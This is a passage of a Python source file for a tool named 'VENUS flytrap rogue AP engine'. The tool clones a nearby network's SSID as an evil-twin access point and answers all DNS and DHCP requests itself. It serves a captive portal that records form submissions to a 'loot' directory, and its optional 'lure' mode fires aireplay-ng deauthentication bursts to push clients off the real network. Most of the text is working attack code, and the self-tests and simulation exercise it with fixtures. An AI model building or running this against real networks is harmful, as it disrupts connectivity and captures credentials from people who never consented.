
    # -- portal pages ------------------------------------------------------ #
    def portal_page(self, which):
        base = self.args.portal_dir
        fname = "success.html" if which == "success" else "index.html"
        path = os.path.join(base, fname) if base else ""
        body = read_text(path, 65536) if path else ""
        if not body:
            body = _FALLBACK_SUCCESS if which == "success" else _FALLBACK_INDEX
        ssid = self.trap_ap.get("ssid", "") if self.trap_ap else ""
        return (body.replace("{{SSID}}", _html_escape(ssid))
                    .replace("{{IP}}", _html_escape(self.ap_ip))
                    .replace("{{TITLE}}", _html_escape(self.args.portal_title)))

    # -- trap lifecycle ---------------------------------------------------- #
    def start_trap(self, ap):
        if self.phase in ("trap", "arming"):
            self.log_event("WARN", "already trapped")
            return
        ssid = (ap.get("ssid") or "").strip()
        if not ssid:
            self.log_event("ERROR", "cannot clone a hidden/empty SSID")
            return
        channel = channel_from_scan(ap)
        freq = int(ap.get("freq") or 0)
        band = ap.get("band") or band_for_freq(freq)
        enc = (ap.get("enc") or "OPN").upper()
        if enc == "WPA3" and not self.args.password:
            self.log_event(
                "WARN", "WPA3 target cloned as OPEN; devices that require "
                        "WPA3/SAE will not auto-join")
        if band == "6":
            self.log_event(
                "WARN", "6 GHz target: most clients require WPA3 on 6 GHz, "
                        "so an open clone may not attract them")
        if enc == "WEP":
            self.log_event("WARN", "WEP target cloned as OPEN")
        if 5000 <= freq < 5925 and 52 <= channel <= 144:
            self.log_event(
                "INFO", f"DFS channel {channel}: beacons may be delayed by CAC")
        # Choose a radio that supports the target band AND is not currently
        # serving the Pager's uplink or a firmware AP. Running a flytrap on a
        # phy the firmware is using can drag its own connectivity/AP onto our
        # channel, so we refuse instead of breaking the Pager.
        safe = self._safe_ap_radio(band)
        if safe is None:
            self.log_event(
                "ERROR",
                "refusing to arm: every band-capable radio is busy serving "
                "the Pager's own WiFi (uplink or management AP active). "
                "Disconnect/turn those off, or override with --no-guard.")
            self.write_state()
            return
        if safe != self.ap_iface:
            old = self.ap_iface
            self.ap_iface = safe
            self.recon_iface = old
            mono = old + "mon"
            self.mon_iface = (mono if mono in list_interfaces() else None)
            self.log_event("INFO", f"AP radio -> {safe} (recon {old})")
        self.pending_ap = dict(ap, ssid=ssid, channel=channel)
        self.phase = "arming"
        self.lure = bool(self.args.lure)
        self.write_state()
        self.log_event("TRAP", f'arming "{ssid}" ch{channel} on {self.ap_iface}')
        rogue = RogueAP(self, self.ap_iface, ssid, channel, freq,
                        password=self.args.password or "", ip=self.ap_ip,
                        country=self.args.country)
        ok, err = rogue.start()
        if not ok:
            self.pending_ap = None
            self.log_event("ERROR", f"trap failed: {err}")
            rogue.stop()
            self.phase = "recon"
            self.write_state()
            return
        if not self.args.no_portal:
            if not rogue.start_portal():
                self.log_event("WARN", "trap is up but the portal failed to bind")
        self.ap = rogue
        self.leasefile = rogue.leasefile
        self.trap_ap = dict(ap, ssid=ssid, channel=channel)
        self.pending_ap = None
        # Trap-scoped counters: a new trap starts with a clean web.
        with self.lock:
            self.clients = {}
            self.counts = {"clients": 0, "portal_hits": 0, "submissions": 0}
        self.phase = "trap"
        self.log_event(
            "TRAP", f'"{ssid}" LIVE on {rogue.ap_iface} ch{channel} '
                    f'{"WPA2" if self.args.password else "OPEN"} @ {self.ap_ip}')
        self.write_state()

    def stop_trap(self):
        if self.ap:
            try:
                self.ap.stop()
            except Exception as e:
                self.log_event("WARN", f"trap teardown: {e}")
        self.ap = None
        self.trap_ap = None
        self.pending_ap = None
        self.lure = False
        self.release_monitor()
        with self.lock:
            self.clients = {}
        self.phase = "recon"
        self.log_event("TRAP", "trap down")
        self.write_state()

    def health_check(self):
        if self.ap and self.ap.hostapd and not self.ap.hostapd.alive():
            self.log_event("ERROR", "hostapd died; trap down")
            self.stop_trap()

    # -- lure (deauth) ----------------------------------------------------- #
    def lure_burst(self):
        if not self.lure or not self.trap_ap:
            return
        mon = self.ensure_monitor()
        if not mon:
            if not self.lure_logged_error:
                self.log_event("WARN", "no second radio for lure; disabled")
                self.lure_logged_error = True
            self.lure = False
            return
        aireplay = find_bin("aireplay-ng")
        if not aireplay:
            if not self.lure_logged_error:
                self.log_event("WARN", "aireplay-ng not found; lure disabled")
                self.lure_logged_error = True
            self.lure = False
            return
        ch = self.trap_ap.get("channel") or 0
        if ch:
            run(["iw", "dev", mon, "set", "channel", str(ch)], timeout=6)
        bssid = self.trap_ap.get("bssid")
        cmd = [aireplay, "--deauth", "5"]
        if bssid:
            cmd += ["-a", bssid]
        cmd += [mon]
        run(cmd, timeout=10)
        self.log_event("LURE", f"deauth burst ch{ch} on {mon}")

    # -- commands ---------------------------------------------------------- #
    def read_commands(self):
        try:
            size = os.path.getsize(self.args.cmd)
        except Exception:
            return
        if size < self.cmd_offset:
            self.cmd_offset = 0
        if size == self.cmd_offset:
            return
        try:
            with open(self.args.cmd, "r", errors="ignore") as f:
                f.seek(self.cmd_offset)
                data = f.read()
                self.cmd_offset = f.tell()
        except Exception:
            return
        for line in data.splitlines():
            line = line.strip()
            if not line:
                continue
            try:
                obj = json.loads(line)
            except Exception:
                continue
            self.handle_command(obj)

    def handle_command(self, obj):
        cmd = obj.get("cmd")
        if cmd == "trap":
            ap = obj.get("ap") or {}
            self.start_trap(ap)
        elif cmd == "untrap":
            self.stop_trap()
        elif cmd == "lure":
            if self.args.no_lure:
                self.log_event("WARN", "lure disabled at launch; ignoring")
            else:
                self.lure = bool(obj.get("on"))
                if not self.lure:
                    self.release_monitor()
                self.log_event("LURE", "lure on" if self.lure else "lure off")
        elif cmd == "quit" or cmd == "shutdown":
            self.running = False
        elif cmd == "clear":
            with self.lock:
                self.clients = {}
                self.events.clear()
            self.log_event("INFO", "state cleared")
        elif cmd == "rescan":
            self.scan_once()

    # -- state ------------------------------------------------------------- #
    def snapshot(self):
        with self.lock:
            clients = []
            for c in sorted(self.clients.values(),
                            key=lambda x: (-(x.get("rssi") or -100), x["first_seen"])):
                clients.append(dict(c))
            cur = self.trap_ap or self.pending_ap
            return {
                "version": STATE_VERSION,
                "ts": round(now(), 3),
                "uptime": round(now() - self.started_at, 1),
                "phase": self.phase,
                "ssid": cur.get("ssid") if cur else None,
                "channel": cur.get("channel") if cur else None,
                "bssid": cur.get("bssid") if cur else None,
                "ap_iface": self.ap_runtime_iface(),
                "recon_iface": self.recon_iface,
                "ap_ip": self.ap_ip,
                "http_port": self.http_port,
                "password": bool(self.args.password),
                "portal": not self.args.no_portal,
                "lure": self.lure,
                "lure_available": not self.args.no_lure,
                "aps": [dict(a) for a in self.aps],
                "clients": clients,
                "events": list(self.events)[-24:],
                "counts": dict(self.counts),
                "error": self.last_error,
            }

    def write_state(self):
        try:
            atomic_write_json(self.args.state, self.snapshot())
        except Exception:
            pass

    # -- run --------------------------------------------------------------- #
    def run(self):
        self.ensure_paths()
        self.pick_radios()
        self.write_state()
        next_scan = 0.0
        next_clients = 0.0
        next_state = 0.0
        next_lure = 0.0
        self.log_event("INFO", "VENUS engine online")
        while self.running:
            self.read_commands()
            t = now()
            if self.phase == "recon" and t >= next_scan:
                self.scan_once()
                next_scan = t + self.args.scan_interval
            elif self.phase == "trap":
                if t >= next_clients:
                    self.tick_clients()
                    next_clients = t + 0.6
                if self.lure and t >= next_lure:
                    self.lure_burst()
                    next_lure = t + self.args.lure_interval
                if t >= next_scan:
                    self.health_check()
                    next_scan = t + 2.0
            if t >= next_state:
                self.write_state()
                next_state = t + 0.4
            time.sleep(0.05)
        self.stop_trap()
        self.phase = "stopped"
        self.write_state()
        self.log_event("INFO", "VENUS engine stopped")

    # -- simulate ---------------------------------------------------------- #
    def simulate(self, duration=0):
        self.ensure_paths()
        self.phase = "recon"
        self.aps = [
            {"bssid": "aa:bb:cc:11:22:33", "ssid": "Cafe_Guest", "channel": 6,
             "freq": 2437, "rssi": -41, "enc": "OPN", "band": "2.4"},
            {"bssid": "aa:bb:cc:44:55:66", "ssid": "Corp-WiFi", "channel": 36,
             "freq": 5180, "rssi": -57, "enc": "WPA2", "band": "5"},
            {"bssid": "aa:bb:cc:77:88:99", "ssid": "HomeNet", "channel": 11,
             "freq": 2462, "rssi": -66, "enc": "WPA2", "band": "2.4"},
            {"bssid": "aa:bb:cc:aa:bb:cc", "ssid": "IoT-Setup", "channel": 1,
             "freq": 2412, "rssi": -73, "enc": "WEP", "band": "2.4"},
        ]
        self.ap_iface = "sim0"
        self.recon_iface = "sim1"
        fake = [
            ("3c:22:fb:1a:2b:3c", -48, "iPhone"),
            ("f0:18:98:4d:5e:6f", -55, "MacBook"),
            ("24:6f:28:aa:bb:cc", -63, ""),
            ("d8:3a:dd:11:22:33", -70, "raspberrypi"),
        ]
        self.trap_ap = dict(self.aps[0])
        self.phase = "trap"
        self.lure = True
        self.counts = {"clients": 0, "portal_hits": 0, "submissions": 0}
        self.log_event("TRAP", 'simulation: trap "Cafe_Guest" live')
        start = now()
        idx = 0
        while self.running:
            self.read_commands()
            t = now()
            if self.phase == "recon":
                self.write_state()
                time.sleep(0.3)
                continue
            if idx < len(fake) and t - start > 1.5 + idx * 1.7:
                mac, rssi, host = fake[idx]
                self.clients[mac] = {
                    "mac": mac, "ip": f"192.168.69.{10 + idx}",
                    "hostname": host,
                    "vendor": vendor_for_mac(mac),
                    "random_mac": is_random_mac(mac), "rssi": rssi,
                    "first_seen": t, "last_seen": t, "connected_time": 0,
                    "inactive_time": None, "rx_bytes": 1000 * (idx + 1),
                    "tx_bytes": 2000 * (idx + 1), "portal_hits": 0,
                    "active": True,
                }
                self.counts["clients"] += 1
                self.log_event("CAUGHT", f"{mac} {vendor_for_mac(mac)} joined")
                idx += 1
            if idx >= 2 and t - start > 6 and self.counts["portal_hits"] == 0:
                self.counts["portal_hits"] += 1
                self.counts["submissions"] += 1
                self.clients[fake[0][0]]["portal_hits"] = 1
                self.log_event("PORTAL", "GET / from 192.168.69.10")
                self.log_event("SUBMIT", "form from 192.168.69.10 (2 fields)")
            for c in self.clients.values():
                if c["active"]:
                    c["rssi"] = (c.get("rssi") or -60) + (1 if int(t) % 2 else -1)
            self.write_state()
            time.sleep(0.2)
            if duration and t - start > duration:
                break
        self.phase = "stopped"
        self.write_state()


def _html_escape(s):
    return (str(s).replace("&", "&amp;").replace("<", "&lt;")
            .replace(">", "&gt;").replace('"', "&quot;"))


# --------------------------------------------------------------------------- #
# Self-test
# --------------------------------------------------------------------------- #

_STATION_FIXTURE = """
Station 3c:22:fb:1a:2b:3c (on wlan1)
	connected time: 42 seconds
	inactive time: 120 ms
	rx bytes: 18342
	tx bytes: 90211
	signal: -48 [-52, -44] dBm
	signal avg: -49 dBm
	tx bitrate: 433.3 MBit/s VHT-MCS 9 80MHz short GI VHT-NSS 2
Station 24:6f:28:aa:bb:cc (on wlan1)
	connected time: 7 seconds
	rx bytes: 120
	tx bytes: 480
	signal: -71 [-75, -68] dBm
"""

_SCAN_FIXTURE = """
BSS aa:bb:cc:11:22:33 (on wlan0)
	freq: 2437
	signal: -41.00 dBm
	capability: ESS ShortSlotTime (0x0401)
	SSID: Cafe_Guest
	DS Parameter set: channel 6
BSS aa:bb:cc:44:55:66 (on wlan0)
	freq: 5180
	signal: -57.00 dBm
	capability: ESS Privacy SpectrumMgmt (0x0511)
	SSID: Corp-WiFi
	RSN:
		* Version: 1
		* Group cipher: CCMP
		* Authentication suites: PSK SAE
	DS Parameter set: channel 36
BSS aa:bb:cc:77:88:99 (on wlan0)
	freq: 2462
	signal: -66.00 dBm
	capability: ESS Privacy (0x0411)
	SSID: HomeNet
	DS Parameter set: channel 11
"""


def selftest():
    checks = []

    def check(name, fn):
        try:
            fn()
            checks.append((name, True, ""))
        except Exception as e:
            checks.append((name, False, f"{type(e).__name__}: {e}"))

    def t_station():
        s = parse_station_dump(_STATION_FIXTURE)
        assert len(s) == 2, s
        assert s["3c:22:fb:1a:2b:3c"]["rssi"] == -48
        assert s["3c:22:fb:1a:2b:3c"]["rx_bytes"] == 18342
        assert s["3c:22:fb:1a:2b:3c"]["connected_time"] == 42
        assert s["24:6f:28:aa:bb:cc"]["rssi"] == -71

    def t_leases():
        txt = ("1700000000 3c:22:fb:1a:2b:3c 192.168.69.10 iPhone-7 "
               "01:3c:22:fb:1a:2b:3c\n1700000000 24:6f:28:aa:bb:cc "
               "192.168.69.11 * *\n")
        l = parse_leases(txt)
        assert l["3c:22:fb:1a:2b:3c"]["ip"] == "192.168.69.10"
        assert l["3c:22:fb:1a:2b:3c"]["hostname"] == "iPhone-7"
        assert l["24:6f:28:aa:bb:cc"]["hostname"] == ""

    def t_arp():
        txt = ("IP address       HW type     Flags       HW address            Mask     Device\n"
               "192.168.69.10    0x1         0x2         3c:22:fb:1a:2b:3c     *        wlan1\n")
        a = parse_arp(txt)
        assert a["3c:22:fb:1a:2b:3c"] == "192.168.69.10"

    def t_scan():
        aps = parse_iw_scan(_SCAN_FIXTURE)
        assert len(aps) == 3, aps
        assert aps[0]["ssid"] == "Cafe_Guest"
        assert aps[0]["channel"] == 6 and aps[0]["band"] == "2.4"
        assert aps[1]["band"] == "5"
        assert aps[1]["enc"] == "WPA3", aps[1]["enc"]
        assert aps[2]["enc"] == "WEP", aps[2]["enc"]

    def t_channel():
        assert channel_from_scan({"channel": 6}) == 6
        assert channel_from_scan({"channel": 0, "freq": 2437}) == 6
        assert channel_from_scan({"channel": 0, "freq": 5180}) == 36
        assert channel_from_scan({}, fallback=11) == 11

    def t_band():
        assert band_for_freq(2437) == "2.4"
        assert band_for_freq(5180) == "5"
        assert band_for_freq(6135) == "6"

    def t_hostapd_open():
        c = build_hostapd_conf("wlan1", "Test", 6, 2437)
        assert "interface=wlan1" in c and "ssid=Test" in c
        assert "hw_mode=g" in c and "channel=6" in c
        assert "wpa=2" not in c

    def t_hostapd_wpa2():
        c = build_hostapd_conf("wlan1", "Test", 36, 5180, password="hunter22")
        assert "hw_mode=a" in c and "channel=36" in c
        assert "wpa_passphrase=hunter22" in c
        assert "ieee80211ac=1" in c

    def t_dnsmasq():
        c = build_dnsmasq_conf("wlan1", "192.168.69.1", "/tmp/l", "/tmp/p")
        assert "interface=wlan1" in c
        assert "dhcp-range=192.168.69.10,192.168.69.100,12h" in c
        assert "address=/#/192.168.69.1" in c
        c2 = build_dnsmasq_conf("wlan1", "192.168.69.1", "/tmp/l", "/tmp/p", dns=False)
        assert "port=0" in c2 and "address=/#/" not in c2

    def t_dns():
        # Build a minimal A query for "example.com".
        q = (b"\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
             b"\x07example\x03com\x00\x00\x01\x00\x01")
        r = build_dns_response(q, "192.168.69.1")
        assert r is not None and r[:2] == b"\x12\x34"
        assert r[-4:] == socket.inet_aton("192.168.69.1")
        assert r[6:8] == b"\x00\x01"

    def t_hostapd_minimal():
        c = build_hostapd_conf("venus0", "Test", 36, 5180, minimal=True)
        assert "hw_mode=a" in c and "channel=36" in c
        assert "ieee80211ac=1" not in c and "ieee80211n=1" not in c
        c2 = build_hostapd_conf("venus0", "Test", 6, 2437, minimal=True)
        assert "ieee80211n=1" not in c2

    def t_dhcp():
        # DISCOVER from aa:bb:cc:00:00:01.
        mac = b"\xaa\xbb\xcc\x00\x00\x01"
        header = (bytes([1, 1, 6, 0]) + b"\x11\x22\x33\x44"
                  + struct.pack("!HH", 0, 0) + b"\x00" * 4
                  + b"\x00" * 4 + b"\x00" * 8 + mac + b"\x00" * 10
                  + b"\x00" * 64 + b"\x00" * 128 + DHCP_MAGIC)
        opts = (_dhcp_option(53, 1) + _dhcp_option(55, b"\x01\x03\x06\x0c")
                + b"\xff")
        req = parse_dhcp_packet(header + opts)
        assert req is not None and req["type"] == 1
        assert req["mac"] == "aa:bb:cc:00:00:01"
        assert req["xid"] == b"\x11\x22\x33\x44"
        reply = build_dhcp_reply(req, 2, "192.168.69.10", "192.168.69.1")
        assert reply[0] == 2                      # BOOTREPLY
        assert socket.inet_ntoa(reply[16:20]) == "192.168.69.10"
        assert reply[236:240] == DHCP_MAGIC
        frame = build_udp_ip_frame("02:00:00:00:00:01",
                                   "ff:ff:ff:ff:ff:ff",
                                   "192.168.69.1", "255.255.255.255",
                                   67, 68, reply)
        # Ethernet + IPv4 header checks
        assert frame[12:14] == struct.pack("!H", ETH_P_IP)
        ip = frame[14:]
        assert ip[9] == 17 and _checksum(ip[:20]) == 0
        udp = ip[(ip[0] & 0x0f) * 4:]
        sport, dport, ulen, ucsum = struct.unpack("!HHHH", udp[:8])
        assert sport == 67 and dport == 68
        assert ulen == 8 + len(reply)

    def t_dhcp_pool():
        import time as _time
        r = DHCPResponder("venus0", "192.168.69.1", "/tmp/venus_selftest_dhcp")
        t = _time.time()
        ip = r.allocate("aa:bb:cc:00:00:01", t)
        assert ip == "192.168.69.10"
        # Same client gets the same offer, next client the next IP.
        assert r.allocate("aa:bb:cc:00:00:01", t) == "192.168.69.10"
        assert r.allocate("aa:bb:cc:00:00:02", t) == "192.168.69.11"
        # commit extends the lease and writes a dnsmasq-compatible line.
        r.commit("aa:bb:cc:00:00:01", "192.168.69.10", "phone", t)
        r.flush_leases()
        with open("/tmp/venus_selftest_dhcp") as f:
            line = f.read().splitlines()[0]
        assert line.startswith(str(int(t + r.lease_time)))
        assert "aa:bb:cc:00:00:01" in line and "192.168.69.10" in line
        assert "phone" in line
        # A request for an in-use IP is a NAK.
        assert not r._available("192.168.69.10", "aa:bb:cc:00:00:02", t)
        try:
            os.remove("/tmp/venus_selftest_dhcp")
            os.remove("/tmp/venus_selftest_dhcp.tmp")
        except OSError:
            pass

    def t_vendor():
        assert vendor_for_mac("3c:22:fb:1a:2b:3c") == "Apple"
        assert vendor_for_mac("24:6f:28:aa:bb:cc") == "Espressif"
        assert vendor_for_mac("3a:22:fb:1a:2b:3c").startswith("Private")
        assert vendor_for_mac("ff:ff:ff:ff:ff:ff") == "Unknown"

    def t_html():
        assert "&lt;x&gt;" == _html_escape("<x>")
        assert "&amp;" == _html_escape("&")

    def t_state_roundtrip():
        import tempfile
        d = tempfile.mkdtemp()
        p = os.path.join(d, "s.json")
        atomic_write_json(p, {"a": 1, "b": [1, 2]})
        with open(p) as f:
            assert json.load(f)["b"] == [1, 2]
        os.remove(p)
        os.rmdir(d)

    def t_client_state():
        args = argparse.Namespace(
            loot="/tmp/venus_selftest", state="/tmp/venus_selftest/s.json",
            cmd="/tmp/venus_selftest/c.jsonl", oui_file=None,
            ap_ip="192.168.69.1", http_port=80, portal_dir=None,
            portal_title="Wi-Fi", capture=True, password="", no_portal=True,
            lure=False, no_lure=True, no_guard=False, iface=None,
            recon_iface=None, scan_interval=6, lure_interval=8)
        e = Engine(args)
        e.ensure_paths()
        e.ap = object()  # tick_clients uses self.ap only as a gate
        e.ap_iface = "wlanX"
        # Directly exercise the merge logic without shelling out.
        t = now()
        e.clients["3c:22:fb:1a:2b:3c"] = {
            "mac": "3c:22:fb:1a:2b:3c", "ip": "", "hostname": "",
            "vendor": "Apple", "random_mac": False, "rssi": -50,
            "first_seen": t, "last_seen": t, "connected_time": 0,
            "inactive_time": None, "rx_bytes": 0, "tx_bytes": 0,
            "portal_hits": 0, "active": True}
        e.note_portal("192.168.69.10", "GET", "/", "ua")
        assert e.counts["portal_hits"] == 1
        snap = e.snapshot()
        assert snap["version"] == STATE_VERSION and "clients" in snap
        assert "recon_iface" in snap
        assert snap["lure_available"] is False
        assert e.leasefile == "/tmp/venus_leases"

    for name, fn in [
        ("station dump parser", t_station),
        ("dnsmasq lease parser", t_leases),
        ("arp parser", t_arp),
        ("iw scan parser", t_scan),
        ("channel derivation", t_channel),
        ("band derivation", t_band),
        ("hostapd open config", t_hostapd_open),
        ("hostapd wpa2/5ghz config", t_hostapd_wpa2),
        ("hostapd minimal config", t_hostapd_minimal),
        ("dnsmasq config", t_dnsmasq),
        ("wildcard DNS response", t_dns),
        ("DHCP packet round-trip", t_dhcp),
        ("DHCP lease pool", t_dhcp_pool),
        ("vendor/randomization", t_vendor),
        ("html escaping", t_html),
        ("state atomic write", t_state_roundtrip),
        ("engine state/portal accounting", t_client_state),
    ]:
        check(name, fn)

    ok = True
    for name, passed, err in checks:
        print(f"[{'PASS' if passed else 'FAIL'}] {name}{(': ' + err) if err else ''}")
        ok = ok and passed
    print(f"\n{sum(1 for _, p, _ in checks if p)}/{len(checks)} checks passed")
    return 0 if ok else 1


# --------------------------------------------------------------------------- #
# main
# --------------------------------------------------------------------------- #

def build_parser():
    p = argparse.ArgumentParser(description="VENUS flytrap rogue AP engine")
    sub = p.add_subparsers(dest="mode")

    def common(sp):
        sp.add_argument("--loot", default="/root/loot/venus")
        sp.add_argument("--state", default=DEFAULT_STATE)
        sp.add_argument("--cmd", default=DEFAULT_CMD)
        sp.add_argument("--ap-ip", default=DEFAULT_AP_IP)
        sp.add_argument("--http-port", type=int, default=80)
        sp.add_argument("--portal-dir", default="")
        sp.add_argument("--portal-title", default="Sign in to Wi-Fi")
        sp.add_argument("--capture", dest="capture", action="store_true", default=True)
        sp.add_argument("--no-capture", dest="capture", action="store_false")
        sp.add_argument("--oui-file", default="")

    r = sub.add_parser("run")
    common(r)
    r.add_argument("--iface", default=None)
    r.add_argument("--recon-iface", default=None)
    r.add_argument("--password", default=os.environ.get("VENUS_PASSWORD", ""))
    r.add_argument("--country", default="US")
    r.add_argument("--no-portal", action="store_true")
    r.add_argument("--lure", action="store_true")
    r.add_argument("--no-lure", action="store_true")
    r.add_argument("--no-guard", action="store_true",
                   help="disable the shared-radio safety guard")
    r.add_argument("--scan-interval", type=float, default=6.0)
    r.add_argument("--lure-interval", type=float, default=8.0)

    s = sub.add_parser("simulate")
    common(s)
    s.add_argument("--duration", type=float, default=0)

    sub.add_parser("selftest")
    return p


def main(argv=None):
    args = build_parser().parse_args(argv)
    if args.mode == "selftest":
        return selftest()
    if args.mode is None:
        build_parser().print_help()
        return 2

    # argparse subparsers do not inherit defaults for run-only options.
    for attr, default in (("iface", None), ("recon_iface", None), ("password", ""),
                          ("country", "US"), ("no_portal", False), ("lure", False),
                          ("no_lure", False), ("no_guard", False),
                          ("scan_interval", 6.0),
                          ("lure_interval", 8.0), ("duration", 0)):
        if not hasattr(args, attr):
            setattr(args, attr, default)

    eng = Engine(args)

    def _stop(sig, frame):
        eng.running = False

    signal.signal(signal.SIGTERM, _stop)
    signal.signal(signal.SIGINT, _stop)
    try:
        signal.signal(signal.SIGHUP, signal.SIG_IGN)
    except Exception:
        pass

    if args.mode == "simulate":
        eng.simulate(args.duration)
        return 0
    eng.run()
    return 0


if __name__ == "__main__":
    sys.exit(main())
